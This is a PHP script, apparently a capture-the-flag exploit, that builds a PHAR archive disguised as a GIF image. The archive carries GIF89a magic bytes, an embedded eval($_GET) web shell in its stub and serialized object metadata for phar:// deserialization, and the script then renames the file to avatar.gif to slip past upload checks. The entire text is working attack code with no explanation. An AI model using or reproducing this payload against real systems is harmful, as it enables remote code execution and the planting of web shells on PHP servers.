<?php
class K0rz3n_secret_flag {
	protected $file_path = "/var/www/data/abdaa764737f78ad84a6522625129aee/avatar.gif";
}
$phar = new Phar('avatar.phar');
$phar->stopBuffering();
$phar->setStub('GIF89a<?php @eval($_GET["v"]);?>' . '<?php __HALT_COMPILER();?>');
$object = new K0rz3n_secret_flag();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
rename(__DIR__ . '/avatar.phar', __DIR__ . '/avatar.gif');